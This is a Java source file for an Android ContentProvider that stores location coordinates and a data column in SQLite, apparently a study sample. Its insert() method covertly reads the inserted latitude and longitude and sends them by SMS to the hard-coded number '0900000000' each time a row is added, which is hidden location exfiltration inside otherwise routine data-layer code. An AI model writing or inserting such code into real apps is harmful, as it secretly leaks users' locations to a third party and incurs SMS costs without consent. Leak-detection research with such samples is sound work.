package com.example.contentprovideraccess;

import android.content.ContentProvider;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.UriMatcher;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteDatabase.CursorFactory;
import android.database.sqlite.SQLiteOpenHelper;
import android.net.Uri;
import android.telephony.SmsManager;


public class MyContentProvider extends ContentProvider
{
	public static final String AUTHORITY = "com.example.study";
	private static final UriMatcher mUriMatcher;
	private static final int URI_TYPE_TABLE1 = 1;
	private static final int URI_TYPE_TABLE2 = 2;
	static
	{
		mUriMatcher = new UriMatcher(UriMatcher.NO_MATCH);
		mUriMatcher.addURI(AUTHORITY, MyDBHelper._DB_TABLE1, URI_TYPE_TABLE1);
		mUriMatcher.addURI(AUTHORITY, MyDBHelper._DB_TABLE2, URI_TYPE_TABLE2);
	}
	private class MyDBHelper extends SQLiteOpenHelper
	{
		public static final String _DB_NAME = "MyDatabases.db";
		public static final String _DB_TABLE1 = "MyTable1";
		public static final String _DB_TABLE2 = "MyTable2";
		public static final int _DB_VERSION = 1;

		public MyDBHelper(Context context)
		{
			super(context, _DB_NAME, null, _DB_VERSION);
		}

		public MyDBHelper(Context context, String name, CursorFactory factory, int version)
		{
			super(context, name, factory, version);
		}

		@Override
		public void onCreate(SQLiteDatabase db)
		{
			db.execSQL( "CREATE TABLE "+_DB_TABLE1+" ( id INTEGER PRIMARY KEY, date DATETIME DEFAULT NULL, lat REAL NOT NULL, lng REAL NOT NULL)" );
			db.execSQL( "CREATE TABLE "+_DB_TABLE2+" ( id INTEGER PRIMARY KEY, data VARCHAR(50) DEFAULT NULL )" );
		}

		@Override
		public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion)
		{
			db.execSQL("DROP TABLE IF EXISTS "+_DB_TABLE1);
			db.execSQL("DROP TABLE IF EXISTS "+_DB_TABLE2);
		}
	}
	MyDBHelper mHelper = null;

	@Override
	public boolean onCreate()
	{
		mHelper = new MyDBHelper(getContext());
		return true;
	}

	@Override
	public String getType(Uri uri)
	{
		switch(mUriMatcher.match(uri))
		{
			case URI_TYPE_TABLE1:
				return ContentResolver.CURSOR_ITEM_BASE_TYPE + "/vnd."+AUTHORITY+"."+MyDBHelper._DB_TABLE1; // one row
			case URI_TYPE_TABLE2:
				return ContentResolver.CURSOR_DIR_BASE_TYPE + "/vnd."+AUTHORITY+"."+MyDBHelper._DB_TABLE2; // multiple rows
			default:
				throw new IllegalArgumentException("Unknown URI " + uri);
		}
	}

	@Override
	public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)
	{
		Cursor out = null;
		SQLiteDatabase mDB = null;
		switch(mUriMatcher.match(uri))
		{
			case URI_TYPE_TABLE1:
				mDB = mHelper.getWritableDatabase();
				out = mDB.query(MyDBHelper._DB_TABLE1, projection, selection, selectionArgs, null, null, sortOrder);
				break;
			case URI_TYPE_TABLE2:
				mDB = mHelper.getWritableDatabase();
				out = mDB.query(MyDBHelper._DB_TABLE2, projection, selection, selectionArgs, null, null, sortOrder);
				break;
			default:
				throw new IllegalArgumentException("Unknown URI " + uri);
		}
		return out;
	}

	@Override
	public Uri insert(Uri uri, ContentValues values)
	{
		SQLiteDatabase mDB = null;
		switch(mUriMatcher.match(uri))
		{
			case URI_TYPE_TABLE1:
				mDB = mHelper.getWritableDatabase();
				mDB.insertOrThrow(MyDBHelper._DB_TABLE1, null, values);
				break;
			case URI_TYPE_TABLE2:
				mDB = mHelper.getWritableDatabase();
				mDB.insertOrThrow(MyDBHelper._DB_TABLE2, null, values);
				break;
			default:
				throw new IllegalArgumentException("Unknown URI " + uri);
		}
		String locStr = "" + values.getAsDouble("lat") + ", " + values.getAsDouble("lng");
		SmsManager smsManager = SmsManager.getDefault();
		smsManager.sendTextMessage("0900000000", null, locStr, null, null);		
		return null;
	}

	@Override
	public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs)
	{
		return 0;
	}

	@Override
	public int delete(Uri arg0, String arg1, String[] arg2)
	{
		return 0;
	}
}